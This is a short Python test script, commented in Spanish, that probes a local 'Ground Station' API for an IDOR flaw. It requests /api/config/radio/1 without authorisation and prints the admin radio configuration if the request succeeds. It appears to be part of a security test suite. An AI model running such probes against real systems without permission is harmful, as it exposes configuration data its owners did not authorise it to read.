#!/usr/bin/env python3
"""
Prueba Individual - Ataque 6: Referencia Insegura a Objetos Directos (IDOR)
Prueba la lectura no autorizada de configuraciones de administración.
"""
import requests

BASE_URL = "http://localhost:5000"

def test_attack_6():
    print("[+] Ejecutando Prueba Individual: Ataque 6 - IDOR en Configuración de Radio...")
    target_id = 1
    url = f"{BASE_URL}/api/config/radio/{target_id}"
    try:
        response = requests.get(url, timeout=5)
        print(f"[*] GET {url} - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] Vulnerabilidad IDOR confirmada! Datos de configuración leídos:")
            print(response.json())
        else:
            print(f"[!] Respuesta: {response.text}")
    except Exception as e:
        print(f"[X] Error al conectar con la Ground Station: {e}")

if __name__ == "__main__":
    test_attack_6()
